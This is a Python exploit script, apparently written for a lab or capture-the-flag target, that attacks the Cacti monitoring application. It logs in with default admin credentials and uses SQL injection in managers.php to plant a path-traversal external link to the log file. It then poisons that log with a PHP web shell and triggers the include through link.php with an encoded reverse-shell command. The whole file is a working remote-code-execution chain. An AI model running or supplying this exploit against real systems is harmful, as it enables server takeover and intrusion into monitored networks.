#! /usr/bin/env python3
import requests, string, re
import urllib3

urllib3.disable_warnings()

# config
local = True
proxy = True
url = "localhost" if local else "x.x.x.x"
port = 7070 if local else 31447
charset = (
    string.ascii_lowercase + string.digits + string.punctuation + string.ascii_uppercase
)

username = "admin"
password = "P@ssw0rd"
lhost = "127.0.0.1"
lport = 1337


sess = requests.Session()
p = {"http": "http://127.0.0.1:8080"} if proxy else {}
sess.proxies.update(p)
# check it's alive
sess.get(f"http://{url}:{port}/", verify=False)


m = re.search(
    r'var\s+csrfMagicToken\s*=\s*"([^"]+)"',
    sess.get(f"http://{url}:{port}/cacti/index.php", verify=False).text,
)
if m:
    csrf_token = m.group(1)
    print(f"[+] csrf token: f{csrf_token}")

# login
body = {
    "action": "login",
    "login_password": password,
    "login_username": username,
    "__csrf_magic": csrf_token,
}

sess.post(f"http://{url}:{port}/cacti/index.php", data=body, verify=False)
print(f"[+] login successful!")

# write file
payload = 'INSERT INTO external_links (id,sortorder,enabled,contentfile,title,style) values (10,2,"on","....//....//log/cacti.log","Test","TAB");'


sess.get(
    f'http://{url}:{port}/cacti/managers.php?selected_items=1&action=actions&action_receivers=1&drp_action=2&selected_graphs_array=a:1:{{i:1;s:{len(payload) + 8}:"1);{payload};-- -";}}',
    verify=False,
)


print(f"[+] payload written to DB!")

# enable external link
m = re.search(
    r'var\s+csrfMagicToken\s*=\s*"([^"]+)"',
    sess.get(
        f"http://{url}:{port}/cacti/user_admin.php?action=user_edit&id=1&tab=realms",
        verify=False,
    ).text,
)
if m:
    csrf_token = m.group(1)
    print(f"[+] csrf token: f{csrf_token}")

# enable link
body2 = {
    "__csrf_magic": csrf_token,
    "section7": "on",
    "section19": "on",
    "section20": "on",
    "section22": "on",
    "section24": "on",
    "section25": "on",
    "section27": "on",
    "section28": "on",
    "section8": ["on"],
    "section2": "on",
    "section9": "on",
    "section10": "on",
    "section11": "on",
    "section12": "on",
    "section13": "on",
    "section14": "on",
    "section16": "on",
    "section17": "on",
    "section3": "on",
    "section4": "on",
    "section5": "on",
    "section23": "on",
    "section1043": "on",
    "section15": "on",
    "section26": "on",
    "section1": "on",
    "section18": "on",
    "section21": "on",
    "section101": "on",
    "section10010": "on",
    "id": "1",
    "tab": "realms",
    "save_component_realm_perms": "1",
    "action": "save",
}

sess.post(f"http://{url}:{port}/cacti/user_admin.php?header=false", data=body2, verify=False)


print(f"[+] external link enabled")

# trigger syntax error to poison file
payload = "gglol'<?php system($_GET[0]);?>'"
sess.get(
    f'http://{url}:{port}/cacti/managers.php?selected_items=1&action=actions&action_receivers=1&drp_action=2&selected_graphs_array=a:1:{{i:1;s:{len(payload)}:"{payload}";}}',
    verify=False,
)

print(f"[+] log poisoned")

# trigger include
print(f"[+] file included")

command = f'php%20-r%20%27%24sock%3Dfsockopen%28%22{lhost}%22%2C{lport}%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'

sess.get(
    f'http://{url}:{port}/cacti/link.php?id=10&0={command}',
    verify=False,
)

print(f"[+] check shell :)")